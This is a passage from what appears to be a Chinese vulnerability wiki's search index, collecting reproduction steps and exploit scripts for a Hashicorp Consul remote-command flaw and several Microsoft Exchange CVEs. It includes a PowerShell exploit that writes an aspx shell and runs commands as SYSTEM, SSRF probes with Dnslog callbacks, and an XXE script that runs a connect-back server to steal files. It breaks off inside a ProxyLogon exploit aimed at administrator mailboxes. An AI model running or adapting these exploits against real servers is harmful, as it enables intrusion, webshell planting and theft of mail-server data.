","date":"0001-01-01","objectID":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 以1.2.4为例，下载地址：https://releases.hashicorp.com/consul/1.2.4/ ","date":"0001-01-01","objectID":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 Windows在当前目录下执行命令： #开启脚本检测功能，该功能开启后漏洞才存在 consul.exe agent -dev -client \u003cyour-target-ip\u003e -enable-script-checks 访问your-target-ip:8500： 验证是否存在该远程命令执行漏洞，访问以下网址，如果EnableRemoteScriptChecks参数为true，则漏洞存在： http://your-target-ip:port/v1/agent/self 也可以使用Meterpreter进行利用： msf6 \u003e search Hashicorp msf6 \u003e use exploit/multi/misc/consul_service_exec ","date":"0001-01-01","objectID":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import argparse from requests.packages import urllib3 urllib3.disable_warnings() from colorama import init init(autoreset=True) import json headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0' } def url(): des=\"Hashicorp Consul Service API远程命令执行漏洞POC\" parser = argparse.ArgumentParser(description=des) parser.add_argument('target_url',type=str,help='The target address,example: http://192.168.140.153') args = parser.parse_args() target_url = args.target_url print(\"Hashicorp Consul Service API远程命令执行漏洞POC\") print(\"[-]正在执行检测...\") print(f\"[-]目标地址：{target_url}\",) return target_url def check(target_url): url = target_url + '/v1/agent/self' try: response = requests.get(url=url,headers=headers,verify=False,timeout=5).text value = json.loads(response)['DebugConfig']['EnableRemoteScriptChecks'] if str(value) == 'True': print('\\033[0;31m[+]漏洞存在\\033[0m') else: print('漏洞不存在') except Exception as a: print('漏洞不存在') if __name__ == '__main__': target_url = url() check(target_url) ","date":"0001-01-01","objectID":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞修复 禁用Consul服务器上的脚本检查功能 确保Consul HTTP API服务无法通过外网访问或调用 对/v1/agent/service/register 禁止PUT方法 ","date":"0001-01-01","objectID":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:6:0","tags":null,"title":"","uri":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Microsoft Exchange Server 远程执行代码漏洞 CVE-2020-17083 ","date":"0001-01-01","objectID":"/microsoft-exchange-server-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-17083/:0:0","tags":null,"title":"","uri":"/microsoft-exchange-server-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-17083/"},{"categories":null,"content":"漏洞描述 参考链接： https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083 https://srcincite.io/pocs/cve-2020-17083.ps1.txt ","date":"0001-01-01","objectID":"/microsoft-exchange-server-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-17083/:1:0","tags":null,"title":"","uri":"/microsoft-exchange-server-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-17083/"},{"categories":null,"content":"漏洞复现 poc： # Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability # Patch: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083 # CVSS v3: 9.1 (/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C) # # Notes: # # The (ab)user needs the \"Exchange Server Certificates\" role assigned # [PS] C:\\Windows\\system32\u003eNew-RoleGroup -Name \"cert users\" -Roles \"Exchange Server Certificates\" -Members \"harryh\" # # Name AssignedRoles RoleAssignments ManagedBy # ---- ------------- --------------- --------- # cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin} # # # [PS] C:\\Windows\\system32\u003eGet-RoleGroup \"cert users\" | Format-List # # # RunspaceId : a97d7e2c-d036-4bfc-b95c-4fabcb644160 # ManagedBy : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin} # RoleAssignments : {Exchange Server Certificates-cert users} # Roles : {Exchange Server Certificates} # DisplayName : # ExternalDirectoryObjectId : # Members : {exchangedemo.com/Users/Harry Houdini} # SamAccountName : cert users # Description : # RoleGroupType : Standard # LinkedGroup : # Capabilities : {} # LinkedPartnerGroupId : # LinkedPartnerOrganizationId : # Identity : exchangedemo.com/Microsoft Exchange Security Groups/cert users # IsValid : True # ExchangeVersion : 0.10 (14.0.100.0) # Name : cert users # DistinguishedName : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com # Guid : 6fb0b860-2cc2-4fe1-9489-d93dbbed8c9f # ObjectCategory : exchangedemo.com/Configuration/Schema/Group # ObjectClass : {top, group} # WhenChanged : 6/12/2020 4:15:54 AM # WhenCreated : 6/12/2020 1:34:51 AM # WhenChangedUTC : 6/11/2020 8:15:54 PM # WhenCreatedUTC : 6/11/2020 5:34:51 PM # OrganizationId : # Id : exchangedemo.com/Microsoft Exchange Security Groups/cert users # OriginatingServer : DEAD01.exchangedemo.com # ObjectState : Changed # # Example: # # PS C:\\Users\\researcher\u003e .\\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harryh@exchangedemo.com -pwd user123### -cmd mspaint # (+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with harryh@exchangedemo.com:user123### # (+) wrote to target file C:/Windows/Temp/rXq1U2tD.hta # (+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/4VFQwc7W.aspx # (+) shell written, executing command... # (+) executed mspaint as SYSTEM! # PS C:\\Users\\researcher\u003e param ( [Parameter(Mandatory=$true)][string]$server, [Parameter(Mandatory=$true)][string]$usr, [Parameter(Mandatory=$true)][string]$pwd, [string]$cmd = \"mspaint\" ) Function Get-RandomAlphanumericString { [CmdletBinding()] Param ( [int] $length = 8 ) Process{ Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length | % {[char]$_}) ) } } function Writebad-File{ Param ( [string] $fn, [string] $content, [System.Management.Automation.Runspaces.PSSession] $session ) $selector = Get-RandomAlphanumericString Invoke-Command -Session $session -ScriptBlock { New-ExchangeCertificate -BinaryEncoded -GenerateRequest -SubjectName \"c=$Using:selector,o=$Using:content,cn=si\" } | Out-Null $thumb = Invoke-Command -Session $session -ScriptBlock { Get-ExchangeCertificate } | Where-Object -Property Subject -like \"*c=$selector*\" | select-object -Expand Thumbprint # this is where the file write is for this bug Invoke-Command -Session $session -ScriptBlock { Export-ExchangeCertificate -Thumbprint $Using:thumb -FileName $Using:fn -BinaryEncoded; } | Out-Null } function Exploit-Exchange { Param ( [string] $server, [string] $usr, [string] $pwd, [string] $cmd ) \"(+) targeting $server with ${usr}:$pwd\" $securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($usr, $securepwd) $s = New-PSSession -Configura","date":"0001-01-01","objectID":"/microsoft-exchange-server-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-17083/:2:0","tags":null,"title":"","uri":"/microsoft-exchange-server-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-17083/"},{"categories":null,"content":"Microsoft Exchange SSRF漏洞 CVE-2021-26885 ","date":"0001-01-01","objectID":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/:0:0","tags":null,"title":"","uri":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/"},{"categories":null,"content":"漏洞描述 Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。2021年03月3日，微软官方发布了Microsoft Exchange安全更新，披露了多个高危严重漏洞，其中：在 CVE-2021-26855 Exchange SSRF漏洞中，攻击者可直接构造恶意请求，以Exchange server的身份发起任意HTTP请求，扫描内网，并且可获取Exchange用户信息。该漏洞利用无需身份认证 ","date":"0001-01-01","objectID":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/:1:0","tags":null,"title":"","uri":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/"},{"categories":null,"content":"漏洞影响 Exchange 2013 Versions \u003c 15.00.1497.012, Exchange 2016 CU18 \u003c 15.01.2106.013, Exchange 2016 CU19 \u003c 15.01.2176.009, Exchange 2019 CU7 \u003c 15.02.0721.013, Exchange 2019 CU8 \u003c 15.02.0792.010 ","date":"0001-01-01","objectID":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/:2:0","tags":null,"title":"","uri":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/"},{"categories":null,"content":"网络测绘 icon_hash=\"1768726119\" ","date":"0001-01-01","objectID":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/:3:0","tags":null,"title":"","uri":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/"},{"categories":null,"content":"漏洞复现 与 SSRF 有关的文件 /owa/auth/Current/themes/resources/logon.css /owa/auth/Current/themes/resources/... /ecp/default.flt /ecp/main.css /ecp/\u003csingle char\u003e.js 查看补丁中的改变，可以看到有关 BackEndServer 使用的类关于 BEResourceRequestHandler 的改变 修复 BEResourceRequestHandler 使用的 BakcEndServer类的补丁 查看调用BERsourceRequestHandler 的方法 SelectHandlerForUnauthenticatedRequest 查找相关路径 ProxyMoudle 可以从中看到需要带有 EXP协议(例如路径 /ecp/), Cookie参数 X-BEResponse, 还有以静态扩展名结尾的 URL (例如 x.js, x.css等) 而其中的请求为 HttpProxy 来实现的，所以大部分的POC中请求的文件为**/etc/y.js** 这样类似不存在的文件 参数 X-BEResource 解析在 BackEndServer.FromString 跟踪 BackEndServer对象， 其中该对象使用 ProxyRequestHandler 向主机发送请求 这里进行SSRF的漏洞复现，首先访问 /ecp/PeiQi.js 文件 并设置Cookie X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true GET /ecp/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true 用这样的方式请求可以确定是否存在 SSRF漏洞 响应包为: NegotiateSecurityContext failed with for host 'peiqi_wiki' with status 'TargetUnknown' 显示这样的就是可能存在了 在通过发送一个请求给 Dnslog确认是否存在 SSRF给 Dnslog发送了一个请求 GET /owa/auth/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; 将其中的 Dnslog换成自己的 确定收到了由服务端发送的请求，存在SSRF漏洞 ","date":"0001-01-01","objectID":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/:4:0","tags":null,"title":"","uri":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Microsoft Exchange多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e mail.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog \u003e\u003e\u003e xxxx.dnslog.cn \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = \"https://\" + target_url + \"/ecp/PeiQi.js\" headers = { 'Cookie': 'X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true' } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 500 and 'NegotiateSecurityContext' in response.text and 'peiqi_wiki' in response.text: print(\"\\033[32m[o] 目标 {} 存在SSRF漏洞， 输入Dnslog地址进一步检测....\\033[0m\".format(target_url)) dnslog = str(input(\"\\033[35mDnslog \u003e\u003e\u003e \\033[0m\")) POC_2(target_url, dnslog) else: print(\"\\033[31m[x] 目标 {} 不存在SSRF漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, dnslog): vuln_url = \"https://\" + target_url + \"/owa/auth/PeiQi.js\" headers = { 'Cookie': 'X-AnonResource=true; X-AnonResource-Backend={}/ecp/default.flt?~3; X-BEResource={}/owa/auth/logon.aspx?~3;'.format(dnslog, dnslog) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 请查看 Dnslog：{} 响应....\\033[0m\".format(dnslog)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/:5:0","tags":null,"title":"","uri":"/microsoft-exchange-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-26885/"},{"categories":null,"content":"Microsoft Exchange 信息泄露漏洞 CVE-2020-17143 ","date":"0001-01-01","objectID":"/microsoft-exchange-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-17143/:0:0","tags":null,"title":"","uri":"/microsoft-exchange-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-17143/"},{"categories":null,"content":"漏洞描述 此漏洞使远程攻击者可以披露有关受影响的Exchange Server安装的信息。利用身份验证才能利用此漏洞。 特定缺陷存在于GetWacIframeUrlForOneDrive服务命令的处理中。造成此问题的原因是缺乏对用户提供的xml的正确验证。攻击者可以利用此漏洞在SYSTEM上下文中披露信息。 Microsoft已发布更新来纠正此漏洞。可以在以下位置找到更多详细信息：https : //portal.msrc.microsoft.com/security-guidance/advisory/CVE-2020-17143 参考链接： https://nvd.nist.gov/vuln/detail/CVE-2020-17143 https://srcincite.io/advisories/src-2020-0030/ ","date":"0001-01-01","objectID":"/microsoft-exchange-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-17143/:1:0","tags":null,"title":"","uri":"/microsoft-exchange-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-17143/"},{"categories":null,"content":"漏洞复现 exp： #!/usr/bin/env python3 import re import sys import urllib3 import requests from threading import Thread from http.server import BaseHTTPRequestHandler, HTTPServer urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) class xxe(BaseHTTPRequestHandler): def log_message(self, format, *args): return def _set_response(self, d): self.send_response(200) self.send_header('Content-type', 'application/xml') self.send_header('Content-Length', len(d)) self.end_headers() def do_GET(self): if \"leaked\" in self.path: print(\"(+) stolen: %s\" % self.path) message = \"\u003c![CDATA[ \u003c![ INCLUDE[]]\u003e ]]\u003e\" self._set_response(message) self.wfile.write(message.encode('utf-8')) self.wfile.write('\\n'.encode('utf-8')) elif \"poc.dtd\" in self.path: print(\"(+) triggered xxe in exchange server!\") message = \"\"\" \u003c!ENTITY %% payload \"%%start;%%stuff;%%end;\"\u003e \u003c!ENTITY %% param1 '\u003c!ENTITY \u0026#x25; external SYSTEM \"http://%s:%d/leaked?%%payload;\"\u003e'\u003e %%param1; %%external;\"\"\" % (host, int(port)) self._set_response(message) self.wfile.write(message.encode('utf-8')) self.wfile.write('\\n'.encode('utf-8')) elif \"poc.xml\" in self.path: d = \"\"\"\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY %% start \"\u003c![CDATA[\"\u003e \u003c!ENTITY %% stuff SYSTEM \"file:///%s\"\u003e \u003c!ENTITY %% end \"]]\u003e\"\u003e \u003c!ENTITY %% dtd SYSTEM \"http://%s:%d/poc.dtd\"\u003e %%dtd; ]\u003e\"\"\" % (file, host, int(port)) self._set_response(d) self.wfile.write(d.encode('utf-8')) self.wfile.write('\\n'.encode('utf-8')) return def main(t, usr, pwd, port): server = HTTPServer(('0.0.0.0', port), xxe) handlerthr = Thread(target=server.serve_forever, args=()) handlerthr.daemon = True handlerthr.start() s = requests.Session() d = { \"destination\" : \"https://%s/owa\" % t, \"flags\" : \"\", \"username\" : usr, \"password\" : pwd } s.post(\"https://%s/owa/auth.owa\" % t, data=d, verify=False) h = { \"X-OWA-UrlPostData\" : '{\"request\":{\"DocumentUrl\":\"\",\"EndPointUrl\":\"http://%s:%d/poc.xml\"}}' % (host, port), \"Action\" : \"GetWacIframeUrlForOneDrive\" } r = s.post(\"https://%s/owa/service.svc\" % t, headers=h, verify=False) assert s.cookies.get(name='X-OWA-CANARY') != None, \"(-) couldn't leak the csrf canary!\" h[\"X-OWA-CANARY\"] = s.cookies.get(name='X-OWA-CANARY') s.post(\"https://%s/owa/service.svc\" % t, headers=h, verify=False) if __name__ == '__main__': if len(sys.argv) != 5: print(\"(+) usage: %s \u003ctarget\u003e \u003cuser:pass\u003e \u003cconnectback ip:port\u003e \u003cfile\u003e\" % sys.argv[0]) print(\"(+) eg: %s 192.168.75.142 harryh@exchangedemo.com:user123# 192.168.75.1:9090 \\\"C:/Users/harryh/secrets.txt\\\"\" % sys.argv[0]) sys.exit(-1) trgt = sys.argv[1] assert \":\" in sys.argv[2], \"(-) you need a user and password!\" usr = sys.argv[2].split(\":\")[0] pwd = sys.argv[2].split(\":\")[1] host = sys.argv[3] port = 9090 file = sys.argv[4] if \":\" in sys.argv[3]: host = sys.argv[3].split(\":\")[0] port = sys.argv[3].split(\":\")[1] assert port.isdigit(), \"(-) not a port number!\" main(trgt, usr, pwd, int(port)) ","date":"0001-01-01","objectID":"/microsoft-exchange-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-17143/:2:0","tags":null,"title":"","uri":"/microsoft-exchange-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-17143/"},{"categories":null,"content":"Microsoft Exchange 远程命令执行 CVE-2021-27065 26857 26858 ","date":"0001-01-01","objectID":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/:0:0","tags":null,"title":"","uri":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/"},{"categories":null,"content":"漏洞描述 Microsoft Exchange Server 是个消息与协作系统。Exchange Server可以被用来构架应用于企业、学校的邮件系统或免费邮件系统。2021年03月03日微软官方披露多个Exchange高危漏洞： CVE-2021-26855 Exchange服务器端请求伪造漏洞。利用此漏洞的攻击者能够以Exchange Server发送HTTP请求，扫描内网，获取Exchange用户信息。 CVE-2021-26857 Exchange反序列化漏洞。该漏洞需要管理员权限，攻击者通过构造恶意请求，触发反序列化漏洞，在服务器上执行恶意代码。 CVE-2021-26858/CVE-2021-27065 Exchange中身份验证后的任意文件写入漏洞。攻击者可以通过CVE-2021-26855的ssrf漏洞获取到的Exchange administrator凭证，构造恶意请求，在系统上写入任意文件。 ","date":"0001-01-01","objectID":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/:1:0","tags":null,"title":"","uri":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/"},{"categories":null,"content":"漏洞影响 Exchange 2013 Versions \u003c 15.00.1497.012 Exchange 2016 CU18 \u003c 15.01.2106.013 Exchange 2016 CU19 \u003c 15.01.2176.009 Exchange 2019 CU7 \u003c 15.02.0721.013 Exchange 2019 CU8 \u003c 15.02.0792.010 ","date":"0001-01-01","objectID":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/:2:0","tags":null,"title":"","uri":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/"},{"categories":null,"content":"网络测绘 icon_hash=\"1768726119\" ","date":"0001-01-01","objectID":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/:3:0","tags":null,"title":"","uri":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/"},{"categories":null,"content":"漏洞复现 4篇关于原理的参考文章： https://www.praetorian.com/blog/reproducing-proxylogon-exploit/ https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/ https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ 其中一次攻击中的日志 可以看到首先请求了 /rpc/ 这个目录 根据网上公布的 POC与EXP，可以看到 NTML协商消息会返回我们NTML询问信息， 其中包含了 AV_PAIR结构，其中包含了 后端服务器名称与域名 base64解密其中的加密部分 再通过解包的方法转换其中的数据就可以得到完整的后端服务器名称与域名 后面的大家就参考文章和EXP来研究原理吧，几篇文章和EXP已经很完整了 ","date":"0001-01-01","objectID":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/:4:0","tags":null,"title":"","uri":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/"},{"categories":null,"content":"漏洞POC EXP根据推特和Github几个脚本更改 默认打的邮箱为 administrator@xxx.xxx.cn (可以自行更改) webshell路径和脚本文件中更改 运行的命令是 ping Dnslog证明漏洞存在(一些东西就大家自己看看脚本改吧~) #!/usr/bin/python2 # coding: UTF-8 import re import sys import json import string import requests from urllib import urlencode from tld import get_fld from struct import unpack from base64 import b64encode, b64decode from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Microsoft Exchang 多个版本 \\033[0m') print('+ \\033[36m使用格式: python poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e mail.xxx.org \\033[0m') print('+ \\033[36mEmail \u003e\u003e\u003e Administrator@根域名 (默认) \\033[0m') print('+------------------------------------------') def _unpack_str(byte_string): return byte_string.decode('UTF-8').replace('\\x00', '') def _unpack_int(format, data): return unpack(format, data)[0] def parse_challenge(Negotiate_base64_decode): target_info_field = Negotiate_base64_decode[40:48] target_info_len = _unpack_int('H', target_info_field[0:2]) target_info_offset = _unpack_int('I', target_info_field[4:8]) target_info_bytes = Negotiate_base64_decode[target_info_offset:target_info_offset + target_info_len] domain_name = '' computer_name = '' info_offset = 0 while info_offset \u003c len(target_info_bytes): av_id = _unpack_int('H', target_info_bytes[info_offset:info_offset + 2]) av_len = _unpack_int('H', target_info_bytes[info_offset + 2:info_offset + 4]) av_value = target_info_bytes[info_offset + 4:info_offset + 4 + av_len] info_offset = info_offset + 4 + av_len if av_id == 2: # MsvAvDnsDomainName domain_name = _unpack_str(av_value) elif av_id == 3: # MsvAvDnsComputerName computer_name = _unpack_str(av_value) if domain_name and computer_name: return domain_name, computer_name else: print(\"\\033[31m[x] 计算机名称或域名称获取失败\") sys.exit(0) def POC_1(target_url, Email): print(\"\\033[32m[o] 正在获取 计算机名称和域名称.....\\033[0m\") ntlm_type1 = ( 'NTLMSSP\\x00' # NTLMSSp签名 '\\x01\\x00\\x00\\x00' # 信息类型 '\\x97\\x82\\x08\\xe2' # 标记 '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' # 域名称字符 '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' # 工作字符 '\\x0a\\x00\\xba\\x47\\x00\\x00\\x00\\x0f' # 系统版本 ) headers = { 'Authorization': 'Negotiate {}'.format(b64encode(ntlm_type1)) } basic_url = 'https://{}/rpc/'.format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=basic_url, headers=headers, verify=False) if response.status_code == 401: Negotiate_base64_encode = response.headers['WWW-Authenticate'] Negotiate_base64_decode = re.search('Negotiate ([A-Za-z0-9/+=]+)', Negotiate_base64_encode).group(1) domain_name, computer_name = parse_challenge(b64decode(Negotiate_base64_decode)) print(\"\\033[32m[o] 计算机名称: {}\\033[0m\".format(computer_name)) print(\"\\033[32m[o] 域名称: {}\\033[0m\".format(domain_name)) POC_2(target_url, Email, computer_name) else: print(\"\\033[31m[x] 获取失败\") sys.exit(0) def POC_2(target_url, Email, computer_name): payload = ''' \u003cAutodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"\u003e \u003cRequest\u003e \u003cEMailAddress\u003e%s\u003c/EMailAddress\u003e \u003cAcceptableResponseSchema\u003ehttp://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\u003c/AcceptableResponseSchema\u003e \u003c/Request\u003e \u003c/Autodiscover\u003e ''' % Email vuln_url = '/autodiscover/autodiscover.xml' headers = { 'User-Agent': 'ExchangeServicesClient/0.0.0.0', 'Content-Type': 'text/xml', 'Cookie': 